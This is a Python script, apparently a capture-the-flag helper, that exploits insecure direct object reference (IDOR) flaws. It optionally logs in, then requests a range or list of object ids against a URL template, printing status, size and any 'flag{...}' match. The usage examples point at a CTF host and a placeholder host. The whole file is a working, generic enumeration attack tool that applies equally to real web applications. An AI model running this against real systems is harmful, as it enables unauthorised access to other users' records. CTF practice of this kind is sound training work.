#!/usr/bin/env python3
"""Enumerate object ids (IDOR). URL contains {} for the id.
Optionally log in first. Prints status/size per id and any flag.

    python idor_enum.py "http://notes1.chal.deti:8020/note/{}" --range 0-50 \
        --login http://notes1.chal.deti:8020/login --login-data "user=guest&pw=guest123"
    python idor_enum.py "http://t/api/users/{}?verbose=true" --range 1-200 -c "session=..."
    python idor_enum.py "http://t/doc/{}" --ids ids.txt --only-200
"""
import argparse
import re

import requests

FLAG = re.compile(r"flag\{[^}]+\}")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--range", default="0-100", help="a-b inclusive")
    ap.add_argument("--ids", help="file with one id per line (overrides --range)")
    ap.add_argument("-c", "--cookie")
    ap.add_argument("-H", "--header", action="append", default=[], help="'Name: value'")
    ap.add_argument("--login", help="login URL to POST first")
    ap.add_argument("--login-data", help="form body for --login")
    ap.add_argument("--only-200", action="store_true")
    ap.add_argument("--grep", help="also print lines matching this regex")
    a = ap.parse_args()
    s = requests.Session()
    if a.cookie:
        s.headers["Cookie"] = a.cookie
    for h in a.header:
        k, v = h.split(":", 1)
        s.headers[k.strip()] = v.strip()
    if a.login:
        r = s.post(a.login, data=a.login_data, timeout=10,
                   headers={"Content-Type": "application/x-www-form-urlencoded"})
        print(f"[login] {r.status_code} cookies={s.cookies.get_dict()}")
    if a.ids:
        ids = [l.strip() for l in open(a.ids) if l.strip()]
    else:
        lo, hi = a.range.split("-")
        ids = [str(i) for i in range(int(lo), int(hi) + 1)]
    g = re.compile(a.grep) if a.grep else None
    for i in ids:
        r = s.get(a.url.replace("{}", i), timeout=10)
        if a.only_200 and r.status_code != 200:
            continue
        print(f"{i:>6} {r.status_code} {len(r.content):7d}")
        for f in FLAG.findall(r.text):
            print(f"       [FLAG] {f}")
        if g:
            for line in r.text.splitlines():
                if g.search(line):
                    print(f"       {line.strip()[:200]}")


if __name__ == "__main__":
    main()
